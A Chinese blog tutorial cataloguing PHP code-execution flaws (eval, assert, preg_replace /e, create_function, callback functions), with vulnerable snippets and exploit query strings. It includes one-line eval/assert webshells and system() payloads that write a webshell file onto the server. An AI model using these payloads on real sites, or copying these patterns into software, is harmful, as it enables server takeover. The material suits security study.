{"blogid": "120683733", "writerAge": "码龄3年", "writerBlogNum": "6", "writerCollect": "51", "writerComment": "6", "writerFan": "8", "writerGrade": "1级", "writerIntegral": "99", "writerName": "LJW_IIE", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_120683733.jpg", "writerRankTotal": "187218", "writerRankWeekly": "1009130", "writerThumb": "10", "writerVisitNum": "10328", "blog_read_count": "4051", "blog_time": "已于 2022-02-15 15:52:44 修改", "blog_title": "PHP代码执行漏洞总结大全", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-light\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p></p>\n<div class=\"toc\">\n<h3>目录</h3>\n<ul><li><a href=\"#__3\">一、 漏洞产生的原因</a></li><li><a href=\"#__5\">二、 漏洞产生的常见函数</a></li><li><ul><li><a href=\"#21_eval_6\">2.1 eval()</a></li><li><ul><li><a href=\"#1__10\">（1） 直接利用漏洞源码：</a></li><li><a href=\"#2_20\">（2）闭合绕过</a></li></ul>\n</li><li><a href=\"#22_assert_59\">2.2 assert()</a></li><li><a href=\"#23_preg_replacee__84\">2.3 preg_replace()+/e 模式</a></li><li><a href=\"#24_create_function__105\">2.4 create_function() 匿名函数</a></li><li><a href=\"#25_array_map__139\">2.5 array_map() 回调函数</a></li><li><ul><li><a href=\"#1_147\">（1）函数使用示范</a></li><li><a href=\"#2_160\">（2）漏洞测试</a></li><li><a href=\"#3_168\">（3）漏洞复现</a></li><li><a href=\"#4_182\">（4）回调函数一句话木马总结</a></li><li><a href=\"#5_189\">（5）补充</a></li></ul>\n</li><li><a href=\"#26_call_user_func_193\">2.6 call_user_func()</a></li><li><a href=\"#27_call_user_func_array_219\">2.7 call_user_func_array()</a></li><li><a href=\"#28_array_filter_232\">2.8 array_filter()</a></li><li><a href=\"#29_usort_255\">2.9 usort()</a></li><li><a href=\"#210_array_walk_275\">2.10 array_walk()</a></li><li><a href=\"#211__ob_start_285\">2.11 ob_start()</a></li><li><a href=\"#212__295\">2.12 动态函数</a></li></ul>\n</li></ul>\n</div>\n<p></p>\n<h1><a id=\"__3\"></a>一、 漏洞产生的原因</h1>\n<p>PHP脚本语言简洁，方便，但也与此同时伴随着一些问题，例如速度慢，无法解除系统底层等等。在web程序中，有时候程序员为了代码的灵活性与简洁性，会适当调用代码执行的函数执行。但由于没有充分考虑到用户是否会使用与控制，最终导致web应用存在代码执行漏洞。</p>\n<h1><a id=\"__5\"></a>二、 漏洞产生的常见函数</h1>\n<h2><a id=\"21_eval_6\"></a>2.1 eval()</h2>\n<blockquote>\n<p>eval(phpcode)</p>\n</blockquote>\n<p>eval() —— 把字符串按照 PHP 代码来计算。</p>\n<h3><a id=\"1__10\"></a>（1） 直接利用漏洞源码：</h3>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\$ret = <span class=\"token interpolation\"><span class=\"token variable\">$data</span></span>;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$ret</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：?data=phpinfo()</p>\n<h3><a id=\"2_20\"></a>（2）闭合绕过</h3>\n<p><strong>- 例子1：</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\$ret = \\\"<span class=\"token interpolation\"><span class=\"token variable\">$data</span></span>\\\";\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$ret</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：</p>\n<ol><li>?data=\";phpinfo();\")//</li><li>?data=${phpinfo()}（php版本5.5及以上）</li><li>?data=\");@eval($_POST[x]);//</li></ol>\n<p><strong>- 例子2：</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\$ret = strtolower('<span class=\"token interpolation\"><span class=\"token variable\">$data</span></span>');\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：</p>\n<ol><li>?data=’);phpinfo();//</li><li>?data=’);$cmd=shell_exec(‘systeminfo’);echo “&lt;pre&gt;{$cmd}&lt;/pre&gt;”;//<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2d207a5750194b939b4d258eea676b69.png\"/></li></ol>\n<p><strong>- 例子3：</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\$ret = strtolower(\\\"<span class=\"token interpolation\"><span class=\"token variable\">$data</span></span>\\\");\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：</p>\n<ol><li>?data=\");phpinfo();//</li><li>?data=${phpinfo()}（php版本5.5及以上）</li><li>?data=${@eval($_POST[x])}</li></ol>\n<h2><a id=\"22_assert_59\"></a>2.2 assert()</h2>\n<p>assert — 检查一个断言是否为 false<br/> ps: assert($a)只能单行执行</p>\n<p><strong>- 例子1：</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$aaa</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"abbbsbbsbbebbrbbt\"</span><span class=\"token punctuation\">;</span> \n<span class=\"token variable\">$ccc</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$aaa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">///$ccc=\"assert\"</span>\n<span class=\"token variable\">$ccc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>漏洞利用：</p>\n<ol><li>POST方法 1=phpinfo();</li><li>菜刀连接</li></ol>\n<p><strong>- 例子2：</strong><br/> 利用assert写木马<br/> 服务器代码：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>网页提交<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\1a134b35f7be4e0cb86f6c5e68d1e17c.png\"/><br/> 执行完后，服务器生成2.php文件<br/> <img alt=\"执行完后，服务器生成2.php文件\" src=\"..\\..\\static\\image\\19c4c440ddd54d189eafbcbb1630ba88.png\"/></p>\n<h2><a id=\"23_preg_replacee__84\"></a>2.3 preg_replace()+/e 模式</h2>\n<p>正则替换函数，配合/e可产生代码执行。<br/> /e 可执行模式，此为PHP专有参数，例如preg_replace函数。 （php7.0以后不再支持/e修饰）</p>\n<p><strong>- 例子1：</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n <span class=\"token variable\">$pattern</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"/^\\d{5,11}$/ie\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token variable\">$qq</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'1231456'</span><span class=\"token punctuation\">;</span>\t\t\n <span class=\"token variable\">$replace</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"phpinfo();\"</span><span class=\"token punctuation\">;</span>\t\t\t\t\n <span class=\"token keyword\">echo</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pattern</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$replace</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$qq</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<p>正则表达式解析：匹配以数字开头的字符串，字符至少5个，最多11个。行尾一定是数字（\\d 为数字类型，{5,11} 5-11个字符，$ 到行尾，后面不能再有字符）</p>\n<p><strong>- 例子2： （木马一句话）</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/abc/e\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></span>\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"abcd\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：?x=phpinfo();</p>\n<h2><a id=\"24_create_function__105\"></a>2.4 create_function() 匿名函数</h2>\n<blockquote>\n<p>create_function ( string $args , string $code )</p>\n</blockquote>\n<p>create_function() —— 定义一个没有名字的函数，直接用变量调用。</p>\n<p><strong>- 例子1：</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$id'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>等同于</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \na <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token function\">Anonymous</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$id</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用： 由于参数$a在被需要调用时才有用，因为在函数里，所以不执行。故闭合绕过函数，</p>\n<ol><li>?x=}phpinfo();// 单行注释</li><li>?x=}phpinfo();/* 多行注释</li></ol>\n<p><strong>- 例子2：</strong></p>\n<p>由于参数$a在被需要调用时才有用，因此我们虚构一个调用函数</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token function\">create_function</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$id'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'afssda'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：?x=phpinfo();</p>\n<h2><a id=\"25_array_map__139\"></a>2.5 array_map() 回调函数</h2>\n<blockquote>\n<p>array_map ( callable $callback , array $array1 [, array $… ] )</p>\n</blockquote>\n<p>array_map() —— 回调函数，可以使用别的函数。</p>\n<p><strong>$o = array_map(函数，传参);</strong></p>\n<h3><a id=\"1_147\"></a>（1）函数使用示范</h3>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token keyword\">function</span> <span class=\"token function\">cube</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$n</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$n</span><span class=\"token operator\">*</span><span class=\"token variable\">$n</span><span class=\"token operator\">*</span><span class=\"token variable\">$n</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span>cube<span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>传入参数\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5daf03cf92454ed9a50122b08ad3ebd2.png\"/></p>\n<h3><a id=\"2_160\"></a>（2）漏洞测试</h3>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h3><a id=\"3_168\"></a>（3）漏洞复现</h3>\n<p><strong>- 例子1：</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span>assert<span class=\"token punctuation\">,</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token comment\">//因为会自动遍历，因此不需要写调用参数x也行。</span>\n</code></pre>\n<p>漏洞利用：?x=phpinfo();<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\60fa5c25b6b049b5a84becfd33954bfb.png\"/><br/> <strong>- 例子2：（进阶骚操作）</strong></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：?1=assert&amp;2=phpinfo();</p>\n<h3><a id=\"4_182\"></a>（4）回调函数一句话木马总结</h3>\n<pre><code class=\"prism language-php\"><span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'assert'</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">array_map</span><span class=\"token punctuation\">(</span>\\<span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\\<span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre>\n<h3><a id=\"5_189\"></a>（5）补充</h3>\n<ol><li>回调函数中，eval无法被调用。由于eval是执行语句，比较特殊，不被认为是函数，属于特殊写法。</li><li>PHP中还有很多回调函数。如call_user_func()等等。</li></ol>\n<h2><a id=\"26_call_user_func_193\"></a>2.6 call_user_func()</h2>\n<blockquote>\n<p>call_user_func ( callable $callback [, mixed $parameter [, mixed $… ]] )</p>\n</blockquote>\n<p>call_user_func —— 第一个参数作为回调函数调用, 其余参数是回调函数的参数</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：</p>\n<ol><li>?a1=system&amp;a2=whoami //命令执行</li><li>?a1=assert&amp;a2=phpinfo() //代码执行</li></ol>\n<p>补充call_user_func函数使用示例：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">welcome</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"hello <span class=\"token interpolation\"><span class=\"token variable\">$name</span></span> &lt;br&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'welcome'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"tom\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">call_user_func</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'welcome'</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jack\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//输出 hello tom  hello jack </span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h2><a id=\"27_call_user_func_array_219\"></a>2.7 call_user_func_array()</h2>\n<blockquote>\n<p>call_user_func_array ( callable $callback , array $param_arr )</p>\n</blockquote>\n<p>call_user_func_array() —— 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">call_user_func_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：</p>\n<ol><li>?a1=system&amp;a2[]=whoami</li><li>?a1=assert&amp;a2[]=phpinfo()</li></ol>\n<h2><a id=\"28_array_filter_232\"></a>2.8 array_filter()</h2>\n<blockquote>\n<p>array array_filter ( array $array [, callable $callback [, int $flag = 0 ]] )</p>\n</blockquote>\n<p>array_filter() —— 把输入数组中的每个键值传给回调函数。如果回调函数返回 true，则把输入数组中的当前键值返回给结果数组。数组键名保持不变。</p>\n<blockquote>\n<p>提示： Window中的^等同于linux的”</p>\n</blockquote>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">array_filter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：</p>\n<ol><li>?1=whoami&amp;2=system</li><li>?1=^dir ..^&amp;2=system</li><li>?1=^dir^&amp;2=system</li><li>?1=^systeminfo^&amp;2=system</li></ol>\n<p>通过上述方法，可以测试出存在代码执行漏洞。因此，注入木马</p>\n<blockquote>\n<p>?1=^echo “&lt;?php @eval($_POST[x]); ?&gt;” &gt; 3.php^&amp;2=system</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\136888f9786945cf8899be8cd032210d.png\"/></p>\n<h2><a id=\"29_usort_255\"></a>2.9 usort()</h2>\n<blockquote>\n<p>usort ( array &amp;$array , callable $value_compare_func )</p>\n</blockquote>\n<p>usort() —— 调用用户自定义的比较函数对数组进行排序。</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token comment\">//PHP5.2以上,PHP5.6及版本以下</span>\n<span class=\"token comment\">//usort($_REQUEST,$_REQUEST[x]); //?1=1&amp;2=phpinfo()&amp;x=assert</span>\n<span class=\"token comment\">//usort($_REQUEST,\"assert\");//?1=1&amp;2=phpinfo()</span>\n<span class=\"token comment\">//usort($_REQUEST,\"system\");//?1=1&amp;2=whoami</span>\n<span class=\"token comment\">//usort($_REQUEST,\"sys\".\"tem\");//?1=1&amp;2=dir</span>\n<span class=\"token function\">usort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"ass\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"ert\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//?1=1&amp;2=$_POST[x] 我实测版本是PHP5.6</span>\n<span class=\"token comment\">//PHP5.6及版本以上</span>\n<span class=\"token comment\">//usort(...$_GET);//据说?1[]=test&amp;1[]=phpinfo();&amp;2=assert</span>\n<span class=\"token comment\">//但是实现不了</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dc89ce7900374f7087557fcd41dcddff.png\"/></p>\n<h2><a id=\"210_array_walk_275\"></a>2.10 array_walk()</h2>\n<blockquote>\n<p>array_walk ( array &amp;$array , callable $callback [, mixed $userdata = NULL ] )</p>\n</blockquote>\n<p>array_walk —— 使用用户自定义函数对数组中的每个元素做回调处理</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">array_walk</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：</p>\n<ol><li>?a[]=phpinfo()&amp;b=assert</li><li>?a[]=whoami&amp;b=system</li></ol>\n<h2><a id=\"211__ob_start_285\"></a>2.11 ob_start()</h2>\n<blockquote>\n<p>ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] )</p>\n</blockquote>\n<p>ob_start —— 打开输出控制缓冲</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'system'</span><span class=\"token punctuation\">;</span><span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span></span>\"</span><span class=\"token punctuation\">;</span><span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：?a=whoami</p>\n<h2><a id=\"212__295\"></a>2.12 动态函数</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>漏洞利用：</p>\n<ol><li>?1=eval&amp;2=$_POST[x]</li><li>?1=assert&amp;2=$_POST[x]</li><li>?1=system&amp;2=whoami</li><li>?1=system&amp;2=^echo “&lt;?php @eval($_POST[x]); ?&gt;” &gt; 1.php^</li></ol>\n<p><strong>本文用途只做学术交流，攥写不易，如果有用，老铁们点个赞。</strong></p>\n<p><strong>参考：</strong><br/> 【1】https://blog.csdn.net/qq_38348692/article/details/100848903<br/> 